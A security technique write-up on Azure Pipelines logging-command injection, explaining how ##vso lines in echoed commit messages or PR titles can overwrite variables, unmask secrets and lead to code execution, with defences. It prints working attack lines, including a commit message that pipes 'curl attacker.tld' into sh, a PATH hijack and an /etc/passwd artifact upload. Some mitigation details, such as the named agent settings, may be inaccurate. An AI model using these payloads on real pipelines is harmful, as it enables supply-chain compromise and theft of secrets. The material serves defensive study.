---
title: Azure Pipelines logging-command injection
slug: azure-pipelines-logging-command-injection
---

> **TL;DR:** Azure DevOps agents parse `##vso[...]` logging commands from stdout; any pipeline step that echoes user-controlled data (commit messages, PR titles, issue bodies, build args) can inject commands to set variables, mark them as secrets, set output variables, or drop tasks — leading to RCE on the agent.

## What it is
Azure Pipelines agents scan every line of step output for the prefix `##vso[area.command property=val;]value` and treat matching lines as instructions: `task.setvariable`, `task.setsecret`, `task.uploadfile`, `task.prependpath`, `artifact.upload`, `build.updatebuildnumber`, and more. If a step `echo`s attacker-controlled text — a git commit message, a `package.json` field, a PR title rendered into a build summary — that text can carry a `##vso` line and the agent will execute it. Legit Security disclosed two RCE variants (CVE-2023-21553, CVE-2023-36561) showing variable overwrite leads to code execution because later steps interpolate variables into shell.

## Preconditions / where it applies
- Target pipeline has a step that echoes/prints data sourced from an attacker-controllable field (commit msg, PR title, file contents, branch name, issue body, package metadata).
- The pipeline runs on a self-hosted or Microsoft-hosted agent that parses `##vso` commands (default).
- A later step interpolates a variable that the attacker can overwrite — `$(VAR)` expansion in script/bash/pwsh steps.

## Technique
**Variable overwrite to RCE:**

```bash
git commit --allow-empty -m $'feat: x\n##vso[task.setvariable variable=BUILD_ARGS]; curl attacker.tld | sh #'
git push origin pr-branch
```

If the pipeline does:

```yaml
- script: docker build $(BUILD_ARGS) .
```

…the next step runs the injected `curl | sh`.

**Prepend PATH to hijack tools:**

```
##vso[task.prependpath]/tmp/evil
```

Later `npm`, `git`, `python` calls resolve to attacker binaries.

**Mark secret variables as outputs / unmark as secret:** `task.setvariable variable=DB_PASS;issecret=false` flips an existing secret to plaintext so it leaks into logs of subsequent steps.

**Artifact upload exfil:**

```
##vso[artifact.upload artifactname=loot]/etc/passwd
```

**Trigger surface:** anything rendered into logs — `git log --pretty`, `cat README.md`, `jq` on a fetched JSON, even error messages from `npm install` that include the malicious dep's name.

The fix Microsoft shipped requires explicit opt-in: set `Agent.LogIssueDataLeakDetection` and use the `pwsh: \| ...` runner properly. Many pipelines still parse commands by default.

## Detection and defence
- Set the agent variable `AZP_AGENT_LOG_NO_TASK_COMMANDS=true` (or `system.commandCorrelationId` checks) where supported, to disable `##vso` parsing for steps that print untrusted data.
- Quarantine untrusted input: pipe through `tr -d '\n'` or base64 before echoing.
- Don't echo PR titles / commit messages into shell steps — use the pipeline's structured variables only.
- Restrict pipeline secret scope (`Secrets.ProtectAccessToYAMLPipelines = true`) so PR builds from forks cannot access prod secrets.
- Monitor build logs for `##vso[` patterns originating outside steps that legitimately emit them.

## References
- [Legit Security — Azure Pipelines RCE](https://www.legitsecurity.com/blog/remote-code-execution-vulnerability-in-azure-pipelines-can-lead-to-software-supply-chain-attack) — original write-up (CVE-2023-21553)
- [Microsoft — Logging commands](https://learn.microsoft.com/en-us/azure/devops/pipelines/scripts/logging-commands) — `##vso` command reference
- [GitHub — checkout sanitisation](https://github.com/actions/checkout) — analogous mitigation in GHA
